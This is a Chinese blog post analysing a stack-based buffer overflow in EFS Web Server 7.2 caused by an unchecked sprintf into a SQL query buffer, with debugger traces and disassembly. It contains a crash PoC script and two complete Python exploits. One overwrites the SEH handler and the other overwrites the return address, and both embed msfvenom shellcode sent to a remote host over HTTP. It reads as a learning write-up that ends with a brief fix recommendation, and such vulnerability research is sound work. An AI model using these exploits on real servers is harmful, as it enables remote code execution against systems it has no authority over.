---
title: EFS Web Server 7.2漏洞分析
date: 2017-12-03 15:45:00
tags: []
categories: "二进制漏洞分析"
---
# EFS Web Server 7.2漏洞分析

## 简介
EFS Web Server是一款web服务器软件，能快速的搭建web服务。它在接受GET请求时，由于没有有效的控制请求字符串的长度导致栈溢出。
***
## 分析环境
```
OS:                 Microsoft Windows 10 64bit 专业版
Software:           EFS Web Server 7.2
winDbg:             6.12.2.633
IDAPro:             6.8 绿色版
python:             python 2.7

```
***
## 漏洞分析
编写如下的脚本用作poc
```python
# coding=utf-8
# fileName: poc.py
# usage: python poc.py ip payloadNums

import socket
import sys

RHOST = sys.argv[1]
RPORT = 80
payload = '\x41'*int(sys.argv[2])

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((RHOST,RPORT))
s.send('GET '+payload+' HTTP/1.0\r\n\r\n')
s.close()
print 'done.'
```
打开EFS，用windbg附加到该进程，然后执行poc，windbg遇到异常被断下
```
(9f0.4220): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=41414141 ebx=00000001 ecx=ffffffff edx=00b65fa4 esi=00b65f7c edi=00b65fa4
eip=61c277f6 esp=00b65ef8 ebp=00b65f10 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Users\gyh\Desktop\1\sqlite3.dll - 
sqlite3!sqlite3_errcode+0x8e:
61c277f6 81784c97a629a0  cmp     dword ptr [eax+4Ch],0A029A697h ds:002b:4141418d=????????

```
这里是因为eax+4ch处的内存没有开辟出来导致内存访问异常，而且eax=41414141这是畸形字符串的值，说明传入的payload已经覆盖了eax，下面进行堆栈回溯找到上层的函数调用去分析漏洞是如何触发的
```
0:007> kb
ChildEBP RetAddr  Args to Child              
WARNING: Stack unwind information not available. Following frames may be wrong.
00b65f10 61c6286c 000011b8 00001194 02ef4724 sqlite3!sqlite3_errcode+0x8e
*** WARNING: Unable to verify checksum for C:\Users\gyh\Desktop\1\fsws.exe
*** ERROR: Module load completed but symbols could not be loaded for C:\Users\gyh\Desktop\1\fsws.exe
00b65f50 00496624 00000001 00000000 00b65f7c sqlite3!sqlite3_declare_vtab+0x3282
00b675f4 00000000 00000000 00b6755c 00b67570 fsws+0x96624

```
函数返回在`61c6286c`处，打开ida载入sqlite3.dll并跳转到该处
```
.text:61C6284E                 push    ebp
.text:61C6284F                 mov     ebp, esp
.text:61C62851                 push    edi
.text:61C62852                 push    esi
.text:61C62853                 push    ebx
.text:61C62854                 sub     esp, 2Ch
.text:61C62857                 mov     ebx, eax
.text:61C62859                 mov     edi, edx
.text:61C6285B                 mov     [ebp+var_1C], ecx
.text:61C6285E                 mov     esi, [ebp+arg_8]
.text:61C62861                 mov     dword ptr [esi], 0
.text:61C62867                 call    _sqlite3SafetyCheckOk
.text:61C6286C                 test    eax, eax			;ret addr
.text:61C6286E                 jz      short loc_61C62874
.text:61C62870                 test    edi, edi
```
显然漏洞的触发位置就在`_sqlite3SafetyCheckOk`，直接跟进去F5
```c
signed int __usercall sqlite3SafetyCheckOk@<eax>(int a1@<eax>)
{
  signed int v1; // ebx@2

  if ( a1 )
  {
    v1 = 1;
    if ( *(_DWORD *)(a1 + 76) != -1607883113 )
    {
      LOBYTE(v1) = 0;
      if ( sqlite3SafetyCheckSickOrOk() )
        sqlite3_log(21, "API call with %s database connection pointer", "unopened");
    }
  }
  else
  {
    sqlite3_log(21, "API call with %s database connection pointer", (unsigned int)"NULL");
    v1 = 0;
  }
  return v1;
}
```
这里的`*(_DWORD *）（a1+76）`就是漏洞触发位置的`[eax+4ch]`，我们应该关注`a1`。这里的`a1`是上层函数传递进来的，回到上层函数F5
```c
signed int __usercall sqlite3LockAndPrepare@<eax>(int a1@<eax>, int a2@<edx>, int a3, int a4, _DWORD *a5, int a6)
{
  int v6; // ebx@1
  int v7; // edi@1
  signed int v8; // edx@3
  signed int v9; // edx@4
  signed int v10; // ST18_4@6

  v6 = a1;
  v7 = a2;
  *a5 = 0;
  if ( sqlite3SafetyCheckOk(a1) && v7 )
  {
    sqlite3_mutex_enter(*(_DWORD *)(v6 + 12));
    sqlite3BtreeEnterAll();
    v9 = sqlite3Prepare(a3, a4, a5, a6);
    if ( v9 == 17 )
    {
      sqlite3_finalize(*a5);
      v9 = sqlite3Prepare(a3, a4, a5, a6);
    }
    v10 = v9;
    sqlite3BtreeLeaveAll();
    sqlite3_mutex_leave(*(_DWORD *)(v6 + 12));
    v8 = v10;
  }
  else
  {
    sqlite3_log(21, "misuse at line %d of [%.10s]", 105119, "9d6c1880fb75660bbabd693175579529785f8a6b");
    v8 = 21;
  }
  return v8;
}
```
该函数传递给`sqlite3SafetyCheckOk`的参数又是上层函数传递进来的第一个参数，所以继续查看`00496624`返回位置处的函数，这个地址是主程序`fsws.exe`的，所以再打开一个ida载入`fsws.exe`
```
.text:00496600                 push    ecx
.text:00496601                 mov     eax, [esp+4+arg_4]
.text:00496605                 push    esi
.text:00496606                 test    eax, eax
.text:00496608                 mov     [esp+8+var_4], 0
.text:00496610                 push    0
.text:00496612                 jz      short loc_496644
.text:00496614                 lea     edx, [esp+0Ch+arg_4]
.text:00496618                 push    edx
.text:00496619                 push    0FFFFFFFFh
.text:0049661B                 push    eax
.text:0049661C                 mov     eax, [ecx]
.text:0049661E                 push    eax
.text:0049661F                 call    sqlite3_prepare_v2		;
.text:00496624                 add     esp, 14h			;ret addr
.text:00496627                 test    eax, eax
.text:00496629                 jz      short loc_49663F
```
该函数调用了`sqlite3_prepare_v2`函数，这个函数属于sqlite3.dll的导出函数，在加载了sqlite3.dll的ida中搜索该函数并F5
```c
int __cdecl sqlite3_prepare_v2(int a1, int a2, int a3, int a4, int a5)
{
  return sqlite3LockAndPrepare(a1, a2, 1, 0, (_DWORD *)a4, a5);
}
```
这个函数又调用了`sqlite3LockAndPrepare(a1, a2, 1, 0, (_DWORD *)a4, a5);`，这样整个函数调用就连接起来了，这里只要关注第一个参数`a1`，还要继续向上回溯。回到加载主程序的ida，找到刚刚位置的函数直接F5
```c
int __thiscall sub_496600(_DWORD *this, int a2, int a3)
{
  int v4; // [sp-4h] [bp-Ch]@1

  v4 = 0;
  if ( a3 )
  {
    if ( sqlite3_prepare_v2(*this, a3, -1, &a3, 0) )
    {
      sub_496710(0);
      return a2;
    }
    v4 = a3;
  }
  sub_496710(v4);
  return a2;
}
```
传递给` sqlite3_prepare_v2`的第一个参数是`sub_496600`的第一个参数指向内存的值，所以要继续向上层回溯看看是那个函数在修改这个值。这里如果用交叉引用的话函数太多，所以直接在windbg中下断点`bp 496600`，然后通过堆栈回溯找到上层调用。触发断点后要继续执行，找到离触发漏洞最近的断点然后分析。
```
0:007> kb
ChildEBP RetAddr  Args to Child              
WARNING: Stack unwind information not available. Following frames may be wrong.
030b75f4 00000000 00000000 030b755c 030b7570 fsws+0x96600

```
可以看到，堆栈回溯无法找到上层函数的调用，可能是因为上层的调用没有标准的使用ebp。这里可以先查看寄存器的值指向的内存，看看有没有与畸形字符串相关的
```
0:007> r
eax=030b5fa4 ebx=00001101 ecx=030b7028 edx=030b715b esi=030b7028 edi=02e2f4fc
eip=00496600 esp=030b5f74 ebp=030b75f4 iopl=0         nv up ei pl nz ac po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000212
fsws+0x96600:
00496600 51              push    ecx

0:007> dc eax
030b5fa4  656c6573 2a207463 6f726620 7173206d  select * from sq
030b5fb4  6261746c 7720656c 65726568 6d616e20  ltable where nam
030b5fc4  41273d65 41414141 41414141 41414141  e='AAAAAAAAAAAAA
030b5fd4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
030b5fe4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
030b5ff4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
030b6004  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
030b6014  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
```
这是一个sql查询，里面有传入的畸形字符串。而且esp与eax的值很相近，说明sql查询字符串就在栈上，可能就是应为sql查询字符串的拼接导致栈的溢出。回到加载主程序的ida查找`select * from`的字符串

![1](http://img.blog.csdn.net/20170910202318859?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQva29zdGFydDEyMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)

发现有很多这样的字符串，但是跟上面的sql查询语句匹配的只有`select * from %s where %s='%s'`，这里有两处，随便跟进去一处
```
.text:004972B1                 push    edi
.text:004972B2                 push    edx
.text:004972B3                 push    eax
.text:004972B4                 push    offset aSelectFromSWhe ; "select * from %s where %s='%s'"
.text:004972B9                 push    ecx             ; char *
.text:004972BA                 call    _sprintf
.text:004972BF                 add     esp, 14h
.text:004972C2                 lea     edx, [esp+1028h+var_100C]
.text:004972C6                 lea     eax, [esp+1028h+var_1014]
.text:004972CA                 mov     ecx, esi
.text:004972CC                 push    edx
.text:004972CD                 push    eax
.text:004972CE                 call    sub_496600			;调用了要关注的函数
.text:004972D3                 add     esi, 4
```
可以发现函数调用`_sprintf`函数，它是一个危险的函数，如果不控制好传入字符串的长度就会造成溢出，而且下面有调用了我们要回溯的函数，所以这里很可能就是造成漏洞的位置。另一处和这里一样都调用了`_sprintf`，那么可以在这两处的`_sprnitf`处下断点看看究竟哪一处能有机会造成漏洞。在分析前同样得找到离漏洞触发最近的一次断点
```
0:007> g
Breakpoint 0 hit
eax=02f549a8 ebx=00001101 ecx=02f549f8 edx=03125fa4 esi=03127028 edi=048cf494
eip=0049747e esp=03125f6c ebp=031275f4 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
fsws+0x9747e:
0049747e e8f71b0600      call    fsws+0xf907a (004f907a)

0:007> dd esp
03125f6c  03125fa4 005a180c 02f549f8 02f549a8
03125f7c  048cf494 ffffffff 031271f8 00001107
03125f8c  02f549f8 02f549a8 00000000 00000000
03125f9c  00000000 02f56000 656c6573 2a207463
03125fac  6f726620 7173206d 6261746c 6c20656c
03125fbc  74696d69 00003120 00000000 00000000
03125fcc  00000000 00000000 00000000 00000000
03125fdc  00000000 00000000 00000000 00000000

0:007> dc 005a180c 
005a180c  656c6573 2a207463 6f726620 7325206d  select * from %s
005a181c  65687720 25206572 25273d73 00002773   where %s='%s'..
005a182c  65687720 25206572 25273d73 00002773   where %s='%s'..
005a183c  656c6573 2a207463 6f726620 7325206d  select * from %s
005a184c  6d696c20 31207469 00000000 656c6573   limit 1....sele
005a185c  2a207463 6f726620 7325206d 65687720  ct * from %s whe
005a186c  25206572 273d3c73 20277325 6564726f  re %s<='%s' orde
005a187c  79622072 73252720 45442027 00004353  r by '%s' DESC..

0:007> dc 048cf494 
048cf494  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
048cf4a4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
048cf4b4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
048cf4c4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
048cf4d4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
048cf4e4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
048cf4f4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
048cf504  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
```
找到离漏洞触发最近的断点后查看了函数的参数，`_sprintf`会把字符串写入`03125f6c`处这在栈上。通过格式字符串可以找到第三个`%s`，而且这里面存放的就是畸形字符串。然后单步步过
```
0:007> 
eax=000011b8 ebx=00001101 ecx=03125f44 edx=0312715b esi=03127028 edi=048cf494
eip=00497483 esp=03125f6c ebp=031275f4 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
fsws+0x97483:
00497483 83c414          add     esp,14h
0:007> dc 03125fa4 
03125fa4  656c6573 2a207463 6f726620 7173206d  select * from sq
03125fb4  6261746c 7720656c 65726568 6d616e20  ltable where nam
03125fc4  41273d65 41414141 41414141 41414141  e='AAAAAAAAAAAAA
03125fd4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
03125fe4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
03125ff4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
03126004  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
03126014  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
```
可以看到字符串已经完全拷贝到栈空间。然后继续单步步过直到`sub_496600`函数的位置
```
0:007> 
eax=03125fa4 ebx=00001101 ecx=03127028 edx=0312715b esi=03127028 edi=048cf494
eip=00497492 esp=03125f78 ebp=031275f4 iopl=0         nv up ei pl nz ac po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000212
fsws+0x97492:
00497492 e869f1ffff      call    fsws+0x96600 (00496600)
```
这里关注一下之后调用`sub_496600`函数的代码，可以看到传入该函数的第一个参数是ecx，而且ecx在`03125fa4`栈地址的下方，所以如果畸形字符串足够长那么就会覆盖ecx指向的内存，根据前面的分析，ecx指向的内存最后就会赋给eax然后造成内存访问异常。可以计算一下`ecx-0x03125fa4-len("select * from sqltable where name='")=4193`,就是说畸形字符串长度超过4193字节后就可能会触发内存访问异常。
***
## 漏洞利用（一）
在造成内存访问异常后，会触发seh异常处理，这里我直接覆盖异常处理句柄进而执行shellcode，暂时不考虑绕过各种安全机制。
编写exp前首先计算如何布局shellcode内存，其实可以利用pwntools中的cyclic工具生成payload进行填写然后可以快速的确定布局，但是这里直接手动计算全是为了学习。

重新调试程序不附加断点
```
0:007> !teb
TEB at 0031e000
    ExceptionList:        03226fa4
    StackBase:            03240000
    StackLimit:           03224000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 0031e000
    EnvironmentPointer:   00000000
    ClientId:             00008af0 . 00002348
    RpcHandle:            00000000
    Tls Storage:          0080bc28
    PEB Address:          00306000
    LastErrorValue:       2
    LastStatusValue:      c0000034
    Count Owned Locks:    0
    HardErrorMode:        0
0:007> dps 03226fa4 l2
03226fa4  41414141
03226fa8  41414141		；seh处理句柄

0:007> dc edi
03225fa4  656c6573 2a207463 6f726620 7173206d  select * from sq
03225fb4  6261746c 7720656c 65726568 6d616e20  ltable where nam
03225fc4  41273d65 41414141 41414141 41414141  e='AAAAAAAAAAAAA
03225fd4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
03225fe4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
03225ff4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
03226004  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
03226014  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA

```
这里虽然被覆盖成畸形字符串，但是第一个seh处理句柄地址不变，另外edi的值就是sql查询字符串的地址（汇编可以分析出来），虽然栈地址每次执行程序都会改变但是相对距离不变，所以这里计算`异常处理句柄地址和payload首部的距离=0x03226fa8-0x03225fa4-len("select * from sqltable where name='")=4065`。然后覆盖异常处理句柄，可以直接在`ImageLoad.dll`的内存空间中搜索`pop pop ret`的跳转指令，这个dll也是主程序要加载的dll，而且它的内存空间的地址没有0字节。这样使程序跳转到shellcode的范围内，这里可以使用相关工具搜索。在异常处理时栈的情况是
```
0:007> dd esp
032255a0  77906202 03225a48 03226fa4 03225a98
032255b0  03225610 03226fa4 77906220 03226fa4
032255c0  03225a20 779061d4 03225a48 03226fa4
032255d0  03225a98 03225610 41414141 03225a98
032255e0  03225a48 03225a30 778e3065 03225a48
032255f0  03226fa4 03225a98 03225610 41414141
03225600  03225fa4 03225f7c 032256dc 778f9fd0
03225610  61866a22 00000000 03224000 03240000

```
那么执行完`ret`后`03226fa4`将作为返回地址赋给eip，这里需要计算`03226fa4`在payload中的位置以便布置shellcode,`03226fa4与payload首部距离=0x03226fa4-0x03225fa4-len("select * from sqltable where name='")=4061`，在payload偏移4061处可以填充一个4字节的向前跳转或向后跳转指令，但注意其后的异常处理句柄的位置。这里使用的shellcode是用`msfvenom`生成的打开一个计算器的shellcode`msfvenom -p windows/exec CMD=calc.exe -e x86/shikata_ga_nai -i 2 -f python -b '\x00\x0a\x0d\x20\x5c\x2c\x25\x2f'`,需要注意的是应该尽量避免特殊字符对payload的影响。于是编写如下exp
```python
# coding=utf-8
# fileName: exp.py
# usage: python exp.py ip
# shellcode by 'msfvenom' use: msfvenom -p windows/exec CMD=calc.exe -e
#                                x86/shikata_ga_nai -i 2 -f python -b '\x00\x0a\x0d\x20\x5c\x2c\x25\x2f'

from socket import *
import sys

buf =  ""
buf += "\xbe\xa6\x51\x73\xac\xdb\xcc\xd9\x74\x24\xf4\x5a\x29"
buf += "\xc9\xb1\x38\x83\xc2\x04\x31\x72\x0e\x03\xd4\x5f\x91"
buf += "\x59\xa6\xfb\x5a\x4e\x3f\x21\xae\x57\xcb\xf2\xdb\x30"
buf += "\x18\x32\x92\xf0\x6f\xb4\xc6\xf1\xff\x27\x6a\x35\x60"
buf += "\xaa\x75\xa3\xe9\x46\x67\x2d\x92\xbd\x0c\xb1\x2a\xa9"
buf += "\xdd\xf2\xba\x76\xba\xf9\x3e\x39\x34\xbc\xa1\xe7\xc0"
buf += "\x71\xf5\x6f\x3c\x8d\xac\xd1\x7c\xf1\x87\xa9\x6a\x4e"
buf += "\xc7\xba\xfc\xcf\xb2\x52\x7c\x1c\x32\x4f\x4a\x67\x71"
buf += "\x3f\x37\x08\xf2\x6b\xb5\x5b\x33\xc4\x79\x61\x8f\xe5"
buf += "\x9f\xc2\x86\xc0\x88\xb4\x56\x33\x56\xfd\x42\xcf\x68"
buf += "\x61\xff\xd3\xd6\x40\x45\x24\x48\x5a\xc5\xcb\x5e\xfd"
buf += "\x4a\xa1\xb1\xa6\xb6\xf0\x37\x98\x12\x18\x14\x7d\x0f"
buf += "\xd3\x1f\xea\xf6\x50\x97\xdc\x75\x9d\x34\x6f\xfc\x56"
buf += "\xe7\xec\xf6\x1b\x6f\xf5\x57\x4b\xd9\xe4\x68\x45\xcf"
buf += "\x58\x76\x4e\x9d\x53\x7a\x62\x6c\x34\xd8\x86\xed\x5a"
buf += "\xf4\x82\x93\x53\x18\xe6\x04\xe8\xd3\x12\x6a\xa1\xa3"
buf += "\xe6\xf0\x4e\x53\x65\x24\xd0\xf2\xa5\xfd\x4d\x11\xa4"
buf += "\xa8\x1b\x4c\x3e\x13\xc3\xfe\x17\x5b\x08\x16\x50\xfe"
buf += "\x1c\xb9\xb8\xee\x74\x7b\x3c\x82\x0c\x26\x39\x72\x77"
#247 bytes
RHOST = sys.argv[1]
RPORT = 80
payload = '\x90'*4061 #junk code
payload += '\xeb\x06\x90\x90' #jmp higher addr;offset = 8-2 = 6 = 0x06
payload += '\x5f\xab\x01\x10' #'pop pop return' addr 0x1001ab5f
payload += buf #shellcode

s = socket(AF_INET,SOCK_STREAM)
s.connect((RHOST,RPORT))
s.send('GET '+payload+' HTTP/1.0\r\n\r\n')
print 'done.'
s.close()
```
***
## 漏洞利用（二）
利用（一）中的分析，如果传入的payload长度为`4193`这时payload无法覆盖到eax那么就不会引起内存访问异常，但是实际上它会引起返回地址被覆盖，从而我们可以利用覆盖返回地址来利用漏洞。下面要确定返回地址在何处被覆盖，这里在前面分析的能造成漏洞的`_sprintf`处下断点并找到离漏洞触发最近的一次
```
0:007> g
Breakpoint 0 hit
eax=030849a8 ebx=00001001 ecx=030849f8 edx=03185fa4 esi=03187028 edi=02ebe1c4
eip=0049747e esp=03185f6c ebp=031875f4 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
fsws+0x9747e:
0049747e e8f71b0600      call    fsws+0xf907a (004f907a)
0:009> dd esp
03185f6c  03185fa4 005a180c 030849f8 030849a8
03185f7c  02ebe1c4 ffffffff 031871f8 00001007
03185f8c  030849f8 030849a8 00000000 00000000
03185f9c  00000000 03086000 656c6573 2a207463
03185fac  6f726620 7173206d 6261746c 6c20656c
03185fbc  74696d69 00003120 00000000 00000000
03185fcc  00000000 00000000 00000000 00000000
03185fdc  00000000 00000000 00000000 00000000
```
然后一直单步步过直到遇到`ret`指令或者触发漏洞时停下，实际上它在执行`ret`之前并不会触发漏洞
```
0:009> 
eax=00000000 ebx=00001007 ecx=41414141 edx=00250000 esi=031871f8 edi=ffffffff
eip=00497562 esp=03186fb0 ebp=031875f4 iopl=0         nv up ei pl nz ac po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000212
fsws+0x97562:
00497562 c20c00          ret     0Ch
0:009> dd esp
03186fb0  41414141 41414141 41414141 41414141
03186fc0  41414141 41414141 41414141 41414141
03186fd0  41414141 41414141 41414141 41414141
03186fe0  41414141 41414141 41414141 41414141
03186ff0  41414141 41414141 41414141 41414141
03187000  41414141 41414141 41414141 41414141
03187010  41414141 41414141 41414141 41414141
03187020  41414141 41414141 05130027 00000000
```
可以看到，函数返回时返回地址已经被畸形字符串覆盖，而且可以计算出`retAddr与payload首部距离=0x03186fb0-0x03185fa4-len("select * from sqltable where name='")=4073`，于是又可以写出利用返回地址覆盖的exp，这里的shellcode仍然是（一）的shellcode
```python
# coding=utf-8
# fileName: exp2.py
# usage: python exp2.py ip
# shellcode by 'msfvenom' use: msfvenom -p windows/exec CMD=calc.exe -e
#                                x86/shikata_ga_nai -i 2 -f python -b '\x00\x0a\x0d\x20\x5c\x2c\x25\x2f'

from socket import *
import sys

buf =  ""
buf += "\xbe\xa6\x51\x73\xac\xdb\xcc\xd9\x74\x24\xf4\x5a\x29"
buf += "\xc9\xb1\x38\x83\xc2\x04\x31\x72\x0e\x03\xd4\x5f\x91"
buf += "\x59\xa6\xfb\x5a\x4e\x3f\x21\xae\x57\xcb\xf2\xdb\x30"
buf += "\x18\x32\x92\xf0\x6f\xb4\xc6\xf1\xff\x27\x6a\x35\x60"
buf += "\xaa\x75\xa3\xe9\x46\x67\x2d\x92\xbd\x0c\xb1\x2a\xa9"
buf += "\xdd\xf2\xba\x76\xba\xf9\x3e\x39\x34\xbc\xa1\xe7\xc0"
buf += "\x71\xf5\x6f\x3c\x8d\xac\xd1\x7c\xf1\x87\xa9\x6a\x4e"
buf += "\xc7\xba\xfc\xcf\xb2\x52\x7c\x1c\x32\x4f\x4a\x67\x71"
buf += "\x3f\x37\x08\xf2\x6b\xb5\x5b\x33\xc4\x79\x61\x8f\xe5"
buf += "\x9f\xc2\x86\xc0\x88\xb4\x56\x33\x56\xfd\x42\xcf\x68"
buf += "\x61\xff\xd3\xd6\x40\x45\x24\x48\x5a\xc5\xcb\x5e\xfd"
buf += "\x4a\xa1\xb1\xa6\xb6\xf0\x37\x98\x12\x18\x14\x7d\x0f"
buf += "\xd3\x1f\xea\xf6\x50\x97\xdc\x75\x9d\x34\x6f\xfc\x56"
buf += "\xe7\xec\xf6\x1b\x6f\xf5\x57\x4b\xd9\xe4\x68\x45\xcf"
buf += "\x58\x76\x4e\x9d\x53\x7a\x62\x6c\x34\xd8\x86\xed\x5a"
buf += "\xf4\x82\x93\x53\x18\xe6\x04\xe8\xd3\x12\x6a\xa1\xa3"
buf += "\xe6\xf0\x4e\x53\x65\x24\xd0\xf2\xa5\xfd\x4d\x11\xa4"
buf += "\xa8\x1b\x4c\x3e\x13\xc3\xfe\x17\x5b\x08\x16\x50\xfe"
buf += "\x1c\xb9\xb8\xee\x74\x7b\x3c\x82\x0c\x26\x39\x72\x77"
#247 bytes
RHOST = sys.argv[1]
RPORT = 80
payload = ''
payload += '\x90'*(4073-len(buf)) #junk code
payload += buf #shellcode
payload += '\x09\x21\x76\x76' #0x76762109,'jmp esp' is from 'user32.dll'
payload += '\x90'*12 #junk code
payload += '\xe9\xec\xfe\xff\xff' #jump higher addr = shellcode;offset = -(8+len(buf)+4+12+5) = -276 = 0xfffffeec

s = socket(AF_INET,SOCK_STREAM)
s.connect((RHOST,RPORT))
s.send('GET '+payload+' HTTP/1.0\r\n\r\n')
print 'done.'
s.close()
```
***
## 修复建议
应当使用安全的函数进行字符串拼接。
***
## 漏洞总结
这种栈溢出的漏洞往往是因为错误的或不安全的使用函数造成的，这个程序正是由于未安全的使用`sprintf`函数造成的溢出。关于漏洞利用方面，我这里使用了攻击seh和覆盖返回地址的方式，但是并没有对windows下的安全机制进行明确的绕过说明，主要是因为还在初步学习漏洞利用的技巧，而且在不同的系统环境下exp是否有效并不能保证。
***
## 参考
> k0shl大佬的视频[https://www.ichunqiu.com/qad/course/56127](https://www.ichunqiu.com/qad/course/56127)